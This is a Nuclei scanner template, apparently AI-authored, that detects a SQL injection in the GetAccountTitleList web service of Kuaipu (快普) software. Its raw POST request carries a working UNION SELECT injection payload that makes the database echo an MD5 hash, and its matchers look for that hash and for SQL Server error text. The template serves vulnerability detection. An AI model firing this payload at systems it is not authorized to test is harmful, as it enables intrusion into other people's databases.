id: kuaipu-getaccounttitlelist-sqli
info:
  name: 快普软件 GetAccountTitleList SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /WebService/wsAutoComplete.asmx/GetAccountTitleList HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        prefixText=a'+UNION+ALL+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')),NULL,NULL--&count=1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "0x{{t2}}"
        negative: false
      - type: regex
        part: body
        regex:
          - "转换成数据类型(.*?)时失败"
          - "在将(.*?)值"
      - type: word
        part: body
        words:
          - "<"
        negative: true
